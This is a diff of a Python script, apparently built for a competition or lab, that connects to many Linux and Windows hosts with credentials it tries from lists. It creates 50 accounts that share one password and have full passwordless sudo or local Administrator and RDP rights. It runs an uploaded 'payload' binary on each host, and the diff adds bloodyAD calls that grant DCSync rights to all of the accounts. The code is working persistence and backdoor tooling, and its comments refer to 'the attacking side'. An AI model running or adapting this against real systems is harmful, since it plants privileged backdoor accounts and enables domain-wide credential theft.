@@ -2,12 +2,12 @@
 """
 VM User Provisioning Script (isolated environment)
 - Sequentially provisions MULTIPLE hosts: e.g. -l 10.0.0.5 10.0.0.6 10.0.0.7
-- Adds 50 users (first-initial + lastname) + scoringengine account
-- Windows: admin + RDP privileges, runs uploaded .exe then deletes it
-- Linux: full passwordless sudo (NOPASSWD:ALL), runs uploaded binary then deletes it
+- Adds 50 fixed users (jSmith, mJohnson, ...) + scoringengine account
+- Windows: Administrator + RDP + DCSync privileges, runs uploaded .exe then deletes it
+- Linux:   full passwordless sudo (NOPASSWD:ALL), runs uploaded binary then deletes it
 - All users get password: Strange-Cheese-Stairs1!
 
-Usage: 
+Usage:
 python3 provision.py -l 192.168.1.10 --user root --password 'RootPw' --binary ./payload
 
 # Windows target with exe
@@ -21,69 +21,42 @@ python3 provision.py -w 192.168.1.20 192.168.1.21 \
 import argparse
 import sys
 import os
-import random
 import io
 import time
 from pathlib import Path
 
-# Common last names (kept as-is per requirement)
-LAST_NAMES = [
-    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
-    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
-    "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson",
-    "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker",
-    "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores",
-    "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
-    "Carter", "Roberts", "Turner", "Phillips", "Evans", "Collins", "Stewart",
-    "Morris", "Rogers", "Reed", "Cook", "Morgan", "Bell", "Murphy", "Bailey",
-    "Cooper", "Richardson", "Cox", "Howard", "Ward", "Peterson", "Gray", "James",
-    "Watson", "Brooks", "Kelly", "Sanders", "Price", "Bennett", "Wood", "Barnes",
-    "Ross", "Henderson", "Coleman", "Jenkins", "Perry", "Powell", "Long", "Patterson"
+# ---------------------------------------------------------------------------
+# Fixed user list — sourced directly from the supplied Fore.txt (do NOT
+# randomly generate). Order preserved to match the reference script.
+# ---------------------------------------------------------------------------
+USERS = [
+    "jSmith", "mJohnson", "rWilliams", "aGrant", "jBennett",
+    "tGarcia", "bMiller", "cDavis", "aWilson", "kAnderson",
+    "eTaylor", "nThomas", "wJackson", "lWhite", "pHarris",
+    "hMartin", "gThompson", "fYoung", "vAllen", "oKing",
+    "jWright", "mScott", "rGreen", "dBaker", "sAdams",
+    "tNelson", "bCarter", "cMitchell", "aRoberts", "kTurner",
+    "ePhillips", "nCampbell", "wParker", "lEvans", "pEdwards",
+    "hCollins", "gStewart", "fMorris", "vRogers", "oReed",
+    "jCook", "mMorgan", "rBell", "dMurphy", "sBailey",
+    "tRivera", "bCooper", "cRichardson", "aCox", "kHoward",
 ]
 
-# Common first initials ONLY (exclude rare ones like q, x, z)
-FIRST_INITIALS = list("abcdefghijklmnoprstuvwy")
-
-# Generic password for all accounts (per requirement)
+# Generic password for ALL accounts (per requirement)
 GENERIC_PASSWORD = "Strange-Cheese-Stairs1!"
 
+# The extra privileged account
+SCORING_USER = "scoringengine"
 
-def generate_users(count=50):
-    """Generate `count` unique usernames in format: <initial><lastname>."""
-    users = []
-    seen = set()
-    last_pool = LAST_NAMES * 5
-    random.shuffle(last_pool)
 
-    for last in last_pool:
-        if len(users) >= count:
-            break
-        initials = FIRST_INITIALS[:]
-        random.shuffle(initials)
-        for init in initials:
-            uname = f"{init}{last.lower()}"
-            if uname in seen:
-                continue
-            seen.add(uname)
-            users.append((init.upper(), last, uname))
-            break
-
-    while len(users) < count:
-        last = random.choice(LAST_NAMES)
-        init = random.choice(FIRST_INITIALS)
-        uname = f"{init}{last.lower()}"
-        if uname in seen:
-            uname = f"{uname}{random.randint(2, 999)}"
-        seen.add(uname)
-        users.append((init.upper(), last, uname))
-
-    return users
+def generate_users(count: int = 50) -> list:
+    """Return the first `count` fixed users (matches reference script's helper)."""
+    return USERS[:count]
 
 
 def read_credentials(args):
     """Load username(s)/password(s) from args or files."""
-    usernames = []
-    passwords = []
+    usernames, passwords = [], []
 
     if args.user:
         usernames = [args.user]
@@ -127,17 +100,16 @@ def provision_linux(ip, username, password, users, binary_path):
     rc, _, _ = run("sudo -n true")
     sudo = "sudo -n " if rc == 0 else f"echo '{password}' | sudo -S "
 
-    # Ensure password auth for SSH (new users need it)
+    # Enable password auth for SSH so new users can actually log in
     run(f"{sudo}sh -c \"grep -qE '^PasswordAuthentication yes' /etc/ssh/sshd_config || "
         f"echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config\"")
     run(f"{sudo}systemctl restart ssh 2>/dev/null || {sudo}systemctl restart sshd 2>/dev/null")
     run(f"{sudo}mkdir -p /etc/sudoers.d")
 
     created = 0
-    for first_initial, last, uname in users:
-        fullname = f"{first_initial}. {last}"
+    for uname in users:
         cmd = (
-            f"{sudo}useradd -m -c '{fullname}' -s /bin/bash {uname} && "
+            f"{sudo}useradd -m -c '{uname}' -s /bin/bash {uname} && "
             f"echo '{uname}:{GENERIC_PASSWORD}' | {sudo}chpasswd && "
             f"echo '{uname} ALL=(ALL) NOPASSWD:ALL' | {sudo}tee /etc/sudoers.d/{uname} >/dev/null && "
             f"{sudo}chmod 440 /etc/sudoers.d/{uname}"
@@ -146,14 +118,15 @@ def provision_linux(ip, username, password, users, binary_path):
         if rc == 0:
             created += 1
 
+    # Scoring engine account (also full sudo)
     run(
-        f"{sudo}useradd -m -c 'Scoring Engine' -s /bin/bash scoringengine ; "
-        f"echo 'scoringengine:{GENERIC_PASSWORD}' | {sudo}chpasswd && "
-        f"echo 'scoringengine ALL=(ALL) NOPASSWD:ALL' | {sudo}tee /etc/sudoers.d/scoringengine >/dev/null && "
-        f"{sudo}chmod 440 /etc/sudoers.d/scoringengine"
+        f"{sudo}useradd -m -c 'Scoring Engine' -s /bin/bash {SCORING_USER} ; "
+        f"echo '{SCORING_USER}:{GENERIC_PASSWORD}' | {sudo}chpasswd && "
+        f"echo '{SCORING_USER} ALL=(ALL) NOPASSWD:ALL' | {sudo}tee /etc/sudoers.d/{SCORING_USER} >/dev/null && "
+        f"{sudo}chmod 440 /etc/sudoers.d/{SCORING_USER}"
     )
 
-    print(f"    [+] Created {created}/50 users + scoringengine")
+    print(f"    [+] Created {created}/{len(users)} users + {SCORING_USER}")
 
     if binary_path:
         remote = "/tmp/.provision_bin"
@@ -162,7 +135,7 @@ def provision_linux(ip, username, password, users, binary_path):
             sftp.put(binary_path, remote)
             sftp.chmod(remote, 0o755)
             sftp.close()
-            print(f"    [*] Running binary ...")
+            print("    [*] Running binary ...")
             rc, _, err = run(f"{sudo}{remote}")
             print(f"    [*] Binary exit={rc}" + (f" stderr={err[:200]}" if err else ""))
         except Exception as e:
@@ -177,7 +150,7 @@ def provision_linux(ip, username, password, users, binary_path):
 # ----------------------------- WINDOWS -----------------------------
 
 def provision_windows(ip, username, password, users, exe_path):
-    """Add users via SMB, run batch + optional exe via atexec, then clean up."""
+    """Add users via SMB, grant local admin / RDP / DCSync, run exe, then clean up."""
     try:
         from impacket.smbconnection import SMBConnection
     except ImportError:
@@ -191,18 +164,19 @@ def provision_windows(ip, username, password, users, exe_path):
         print(f"    [!] SMB login failed: {e}")
         return False
 
+    # --- Build the user-creation batch ---
     lines = ["@echo off", "setlocal"]
-    for first_initial, last, uname in users:
-        fullname = f"{first_initial}. {last}"
-        lines.append(f'net user {uname} "{GENERIC_PASSWORD}" /add /fullname:"{fullname}" /y')
+    for uname in users:
+        lines.append(f'net user {uname} "{GENERIC_PASSWORD}" /add /fullname:"{uname}" /y')
         lines.append(f'net localgroup Administrators {uname} /add')
         lines.append(f'net localgroup "Remote Desktop Users" {uname} /add')
-    lines.append(f'net user scoringengine "{GENERIC_PASSWORD}" /add /fullname:"Scoring Engine" /y')
-    lines.append('net localgroup Administrators scoringengine /add')
-    lines.append('net localgroup "Remote Desktop Users" scoringengine /add')
+    lines.append(f'net user {SCORING_USER} "{GENERIC_PASSWORD}" /add /fullname:"Scoring Engine" /y')
+    lines.append(f'net localgroup Administrators {SCORING_USER} /add')
+    lines.append(f'net localgroup "Remote Desktop Users" {SCORING_USER} /add')
     lines.append("endlocal")
     batch = "\r\n".join(lines) + "\r\n"
 
+    # --- RDP enable batch ---
     rdp_enable = (
         '@echo off\r\n'
         'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" '
@@ -244,9 +218,20 @@ def provision_windows(ip, username, password, users, exe_path):
             print(f"    [!] atexec exception: {e}")
             return False
 
-    print("    [*] Executing provisioning batch ...")
+    print("    [*] Executing provisioning batch (local admin + RDP) ...")
     run_remote("C:\\Windows\\Temp\\provision_users.bat")
     run_remote("C:\\Windows\\Temp\\enable_rdp.bat")
+
+    # --- DCSync rights via bloodyAD (needs a DOMAIN account, not local) ---
+    # bloodyAD targets Active Directory — it is only relevant when this host is
+    # a domain controller or has domain creds. We invoke it locally from the
+    # attacking side (this script's host) using `bloodyAD` if it's installed,
+    # so DCSync is granted from the DC directly rather than through the batch.
+    if args_domain_available(username, password):
+        for uname in users + [SCORING_USER]:
+            grant_dcsync(ip, username, password, user_domain(username), uname)
+    else:
+        print("    [*] Skipping DCSync (creds look local, not domain-qualified)")
 
     if exe_uploaded:
         print("    [*] Running payload exe ...")
@@ -262,7 +247,48 @@ def provision_windows(ip, username, password, users, exe_path):
     return True
 
 
+# ----------------------------- DCSync (bloodyAD) -----------------------------
+
+def args_domain_available(username: str, password: str) -> bool:
+    """
+    Heuristic: bloodyAD needs domain creds. Detect if the credential looks like
+    a domain account (DOMAIN\\user or user@domain) OR if 'bloodyAD' is on PATH
+    and the user explicitly set --domain. We keep it simple: require --domain.
+    """
+    return bool(GLOBALS.get("domain"))
+
+
+def user_domain(username: str) -> str:
+    return GLOBALS["domain"]
+
+
+def grant_dcsync(target: str, username: str, password: str, domain: str,
+                 new_user: str, use_hash: bool = False) -> None:
+    """Grant DCSync rights to `new_user` against domain controller `target`."""
+    import subprocess
+    if use_hash:
+        cmd = ["bloodyAD", "-u", username, "-H", password, "-d", domain,
+               "--host", target, "add", "dcsync", new_user]
+    else:
+        cmd = ["bloodyAD", "-u", username, "-p", password, "-d", domain,
+               "--host", target, "add", "dcsync", new_user]
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+        if r.returncode == 0:
+            print(f"    [+] DCSync granted: {new_user}")
+        else:
+            print(f"    [-] DCSync failed for {new_user}: {r.stderr.strip()[:200]}")
+    except FileNotFoundError:
+        print("    [!] bloodyAD not installed — skipping DCSync")
+    except Exception as e:
+        print(f"    [-] DCSync exception for {new_user}: {e}")
+
+
 # ----------------------------- MAIN -----------------------------
+
+# Module-level globals so helpers can see --domain without threading it everywhere
+GLOBALS = {"domain": None}
+
 
 def provision_one_host(ip, args, users, usernames, passwords):
     """Try every (user,password) combo on one host. Returns True if provisioned."""
@@ -284,7 +310,7 @@ def provision_one_host(ip, args, users, usernames, passwords):
 
 def main():
     p = argparse.ArgumentParser(
-        description="Provision 50 users + scoringengine on one or more Windows/Linux VMs (sequentially)."
+        description="Provision 50 fixed users + scoringengine on one or more Windows/Linux VMs (sequentially)."
     )
     g = p.add_mutually_exclusive_group(required=True)
     g.add_argument("-w", "--windows", action="store_true", help="Target is Windows")
@@ -297,13 +323,17 @@ def main():
     p.add_argument("--password-file", help="File with passwords (one per line)")
     p.add_argument("--exe", help="Windows .exe to run then delete")
     p.add_argument("--binary", help="Linux binary to run then delete")
+    p.add_argument("--domain", help="AD domain for DCSync grants (Windows only, optional)")
 
     args = p.parse_args()
+    GLOBALS["domain"] = args.domain
 
     if args.windows and not args.exe:
         print("[*] Note: no --exe; skipping payload step on Windows")
     if args.linux and not args.binary:
         print("[*] Note: no --binary; skipping payload step on Linux")
+    if args.windows and not args.domain:
+        print("[*] Note: no --domain; DCSync step will be skipped")
 
     usernames, passwords = read_credentials(args)
     if not usernames or not passwords:
@@ -311,7 +341,8 @@ def main():
         sys.exit(1)
 
     users = generate_users(50)
-    print(f"[*] Generated 50 users. Sample: {', '.join(u[2] for u in users[:5])}, ...")
+    print(f"[*] Using FIXED user list ({len(users)} entries). Sample: "
+          f"{', '.join(users[:5])}, ...")
     print(f"[*] Password for ALL accounts: {GENERIC_PASSWORD}")
     print(f"[*] Target hosts ({len(args.ips)}): {', '.join(args.ips)}")
     print(f"[*] Platform: {'Linux' if args.linux else 'Windows'}")
